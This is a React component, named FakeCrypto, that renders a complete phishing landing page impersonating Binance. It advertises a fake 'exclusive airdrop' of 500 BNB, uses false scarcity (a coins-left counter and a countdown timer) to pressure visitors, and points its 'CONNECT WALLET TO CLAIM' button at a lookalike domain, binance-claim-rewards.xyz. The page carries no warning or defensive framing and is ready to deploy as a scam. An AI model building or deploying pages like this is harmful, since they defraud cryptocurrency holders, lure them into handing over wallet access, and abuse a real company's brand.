
import React from 'react';

export default function FakeCrypto() {
  return (
    <div className="min-h-screen bg-gray-900 text-white font-mono flex items-center justify-center p-4">
      <div className="max-w-2xl w-full text-center space-y-8">
        <div className="animate-pulse">
          <h1 className="text-5xl font-bold text-yellow-400 mb-2">BINANCE</h1>
          <p className="text-xl text-gray-300 tracking-widest">EXCLUSIVE AIRDROP EVENT</p>
        </div>
        
        <div className="bg-gray-800 border-2 border-yellow-500 p-8 rounded-xl shadow-[0_0_20px_rgba(234,179,8,0.3)]">
          <h2 className="text-3xl font-bold mb-4">Claim Your 500 BNB Now!</h2>
          <p className="text-gray-300 mb-6 text-lg">
            To celebrate our 5th anniversary, we are distributing 10,000 BNB to active users. 
            This offer is limited to the first 1,000 participants.
          </p>
          
          <div className="flex justify-center space-x-4 mb-8">
            <div className="bg-gray-700 p-3 rounded">
              <span className="block text-2xl font-bold text-green-400">432</span>
              <span className="text-xs text-gray-400">BNB Left</span>
            </div>
            <div className="bg-gray-700 p-3 rounded">
              <span className="block text-2xl font-bold text-red-400">04:12</span>
              <span className="text-xs text-gray-400">Time Remaining</span>
            </div>
          </div>
          
          <a href="http://binance-claim-rewards.xyz/wallet-connect" className="inline-block bg-yellow-500 text-black font-bold text-xl py-4 px-12 rounded-full hover:bg-yellow-400 transform hover:scale-105 transition duration-200 shadow-lg">
            CONNECT WALLET TO CLAIM
          </a>
          
          <p className="mt-4 text-sm text-gray-500">
            *By connecting your wallet, you agree to the Terms of Service. 
            Gas fees may apply.
          </p>
        </div>
        
        <div className="flex justify-center space-x-8 text-gray-500 text-sm">
          <a href="#" className="hover:text-white">Support</a>
          <a href="#" className="hover:text-white">Terms</a>
          <a href="#" className="hover:text-white">Privacy</a>
        </div>
      </div>
    </div>
  );
}
